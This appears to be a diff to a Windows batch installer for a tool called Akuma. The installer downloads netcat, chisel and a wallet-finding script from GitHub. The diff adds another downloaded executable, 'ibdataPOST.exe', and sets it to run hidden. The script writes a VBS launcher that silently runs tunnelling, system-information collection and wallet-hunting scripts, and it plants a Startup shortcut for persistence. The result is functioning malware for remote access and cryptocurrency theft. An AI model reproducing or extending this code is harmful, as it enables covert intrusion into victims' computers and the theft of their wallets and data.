@@ -8,7 +8,9 @@ mkdir %userprofile%\Akuma\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %userprofile%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %userprofile%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %userprofile%\Akuma\chisel.exe
+curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/ibdataPOST.exe > %userprofile%\Akuma\ibdataPOST.exe
 curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %userprofile%\Akuma\WalletFinder.bat
+
 cd %userprofile%\Akuma
 echo del %userprofile%\Akuma\systeminfo.txt >> %userprofile%\Akuma\zonbi.bat
 echo systeminfo ^>^> %userprofile%\Akuma\systeminfo.txt >> %userprofile%\Akuma\zonbi.bat
@@ -29,6 +31,8 @@ echo objShell.Run "%userprofile%\Akuma\chisel.bat", 0, False >> %userprofile%\Ak
 echo objShell.Run "%userprofile%\Akuma\zonbi.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo objShell.Run "%userprofile%\Akuma\network.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo objShell.Run "%userprofile%\Akuma\WalletFinder.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
+echo objShell.Run "%userprofile%\Akuma\ibdataPOST.exe", 0, False >> %userprofile%\Akuma\ibdataPOST.exe
+
 echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BeyondBirthday.lnk"
 echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%AppData%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%userprofile%\Akuma\Akuma.vbs';$s.Save()"
